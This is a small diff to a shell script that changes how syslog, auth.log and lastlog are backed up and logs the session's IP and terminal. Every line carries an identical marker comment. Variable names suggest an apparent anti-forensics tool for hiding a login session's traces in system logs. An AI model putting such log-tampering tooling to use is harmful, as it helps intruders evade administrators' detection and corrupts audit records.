@@ -66,9 +66,12 @@ if [ !  -f $clear_shell ];then #_fdsagadsfasdgadsgsss
 fi #_fdsagadsfasdgadsgsss
 if [ ! -f  $index_f ];then #_fdsagadsfasdgadsgsss
   gglog "bak /var/log/" #_fdsagadsfasdgadsgsss
-  _bak /var/log/syslog; #_fdsagadsfasdgadsgsss
-  _bak /var/log/auth.log; #_fdsagadsfasdgadsgsss
-  _bak /var/log/lastlog; #_fdsagadsfasdgadsgsss
+  _n=$(pwd); #_fdsagadsfasdgadsgsss
+  cd /var/log; #_fdsagadsfasdgadsgsss
+  _bak syslog; #_fdsagadsfasdgadsgsss
+  _bak auth.log; #_fdsagadsfasdgadsgsss
+  _bak lastlog; #_fdsagadsfasdgadsgsss
+  cd $_n; #_fdsagadsfasdgadsgsss
 fi #_fdsagadsfasdgadsgsss
 gglog "${UNDERLINE}ip:$my_ip pts:${my_pts}  ${REST}" #_fdsagadsfasdgadsgsss
 CL #_fdsagadsfasdgadsgsss
